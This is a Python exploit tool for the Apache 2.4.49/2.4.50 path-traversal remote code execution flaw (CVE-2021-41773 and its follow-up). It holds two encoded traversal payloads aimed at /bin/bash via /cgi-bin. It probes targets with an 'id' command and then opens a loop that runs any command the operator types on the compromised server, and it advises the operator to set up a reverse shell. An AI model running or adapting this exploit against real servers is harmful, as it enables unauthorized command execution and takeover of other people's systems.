#! /usr/bin/python3
# -*- encoding: utf-8 -*-


import os
from libs.reqset import ReqSet
import time
import requests
from colorama import Fore, Style
import urllib3
urllib3.disable_warnings()
class Cve_2021_41773:
    def end(self):
        print("\t\033[1;91m[!] Bye bye !")
        time.sleep(0.5)
        return
    
    
    def commands(self,url, command, session):
        directory = self.mute_command(url, 'pwd')
        user = self.mute_command(url, 'whoami')
        hostname = self.mute_command(url, 'hostname')
        advise = print(Fore.YELLOW + 'Reverse shell is advised (This isn\'t an interactive shell)')
        command = input(f"{Fore.RED}╭─{Fore.GREEN + user}@{hostname}: {Fore.BLUE + directory}\n{Fore.RED}╰─{Fore.YELLOW}$ {Style.RESET_ALL}")
        command = f"echo; {command};"
        req = requests.Request('POST', url=url, data=command,headers=self.headers)
        prepare = req.prepare()
        prepare.url = url
        response = session.send(prepare, timeout=5)
        output = response.text
        print(output)
        if 'clear' in command:
            os.system('/usr/bin/clear')
            print(self.banner)
        if 'exit' in command:
            return
    
    
    def mute_command(self,url, command):
        session = requests.Session()
        req = requests.Request('POST', url=url, data=f"echo; {command}",headers=self.headers)
        prepare = req.prepare()
        prepare.url = url
        response = session.send(prepare, timeout=5)
        return response.text.strip()
    
    
    def exploitRCE(self,payload):
        s = requests.Session()
        try:
            host = self.url
            if 'http' not in host:
                url = 'http://' + host + payload
            else:
                url = host + payload
            session = requests.Session()
            command = "echo; id"
            req = requests.Request('POST', url=url, data=command,headers=self.headers)
            prepare = req.prepare()
            prepare.url = url
            response = session.send(prepare, timeout=5)
            output = response.text
            if "uid" in output:
                choice = "Y"
                print(Fore.GREEN + '[!] Target %s is vulnerable !!!' % host)
                print("[!] Sortie:\n\n" + Fore.YELLOW + output)
                choice = input(Fore.CYAN + "[?] Do you want to exploit this RCE ? (Y/n) : ")
                if choice.lower() in ['', 'y', 'yes']:
                    while True:
                        self.commands(url, command, session)
                else:
                    self.end()
            else:
                print(Fore.RED + 'Target %s isn\'t vulnerable' % host)
        except KeyboardInterrupt:
            self.end()
    
    
    def main(self,target):

        self.banner = '''\033[1;91m

             ▄▄▄       ██▓███   ▄▄▄       ▄████▄   ██░ ██ ▓█████     ██▀███   ▄████▄  ▓█████
            ▒████▄    ▓██░  ██▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
            ▒██  ▀█▄  ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███      ▓██ ░▄█ ▒▒▓█    ▄ ▒███
            ░██▄▄▄▄██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄    ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
            ▓█   ▓██▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
            ▒▒   ▓▒█░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
            ▒   ▒▒ ░░▒ ░       ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
            ░   ▒   ░░         ░   ▒   ░         ░  ░░ ░   ░        ░░   ░ ░           ░
        ''' + Style.RESET_ALL
        self.url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]

        req = ReqSet(header=header)
        self.headers = req["header"]
        try:
            apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
            apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
            payloads = [apache2449_payload, apache2450_payload]
            choice = len(payloads) + 1
            print(self.banner)
            print("\033[1;37m[0] Apache 2.4.49 RCE\n[1] Apache 2.4.50 RCE")
            while choice >= len(payloads) and choice >= 0:
                choice = int(input('[~] Choice : '))
                if choice < len(payloads):
                    self.exploitRCE(payloads[choice])
        except KeyboardInterrupt:
            print("\n\033[1;91m[!] Bye bye !")
            time.sleep(0.5)
            return



